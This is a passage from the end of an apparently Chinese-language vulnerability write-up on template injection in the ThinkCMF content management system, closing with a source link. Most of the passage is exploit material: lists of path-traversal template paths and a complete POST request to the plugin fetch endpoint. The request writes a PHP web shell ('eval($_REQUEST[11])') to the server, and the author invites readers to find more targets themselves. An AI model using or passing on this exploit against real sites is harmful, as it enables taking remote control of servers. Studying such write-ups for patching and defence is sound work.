class="cs9FB05234">/../plugins/Demo/View/admin_index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../plugins/Demo/View/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../plugins/Demo/View/widget</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Install/View/Public/footer</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Install/View/Public/head</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Install/View/Public/header</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Common/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Portal/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Api/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Api/Lang/zh-cn/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Comment/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../application/Comment/Lang/zh-cn/index</span></p><p class="cs3A447A38"><span class="cs9FB05234">url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">templateFile=/../../../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">prefix=&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">content=&lt;php&gt;file_put_contents(&#39;test1.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;</span></p><p class="cs3A447A38"><span class="cs9FB05234">/../../../public/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../public/exception</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../data/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../data/runtime/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Mobileverify/View/admin_index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Mobileverify/View/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Mobileverify/View/widget</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Demo/View/admin_index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Demo/View/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../plugins/Demo/View/widget</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Install/View/Public/footer</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Install/View/Public/head</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Install/View/Public/header</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Common/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Portal/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Api/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Api/Lang/zh-cn/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Comment/Lang/en-us/index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/../../../application/Comment/Lang/zh-cn/index</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">还有最后一句废话：模版注入对于</span><span class="cs8926E06">linux </span><span class="cs9C1B1871">并不好用</span><span class="cs8926E06"> : ) </span><span class="cs9C1B1871">差不多了，剩下的自己去</span><span class="cs8926E06">thinkcmf</span><span class="cs9C1B1871">里面自己找</span></p><h2 class="cs868C439D">
			<a name="四、参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">文章来源于</span><span class="cs8926E06"><a class="cs508254C" href="https://www.yuque.com/pmiaowu/bfgkkh/aiiak1"><span class="cs4B51D5E4">https://www.yuque.com/pmiaowu/bfgkkh/aiiak1</span></a></span></p></body>
</html>
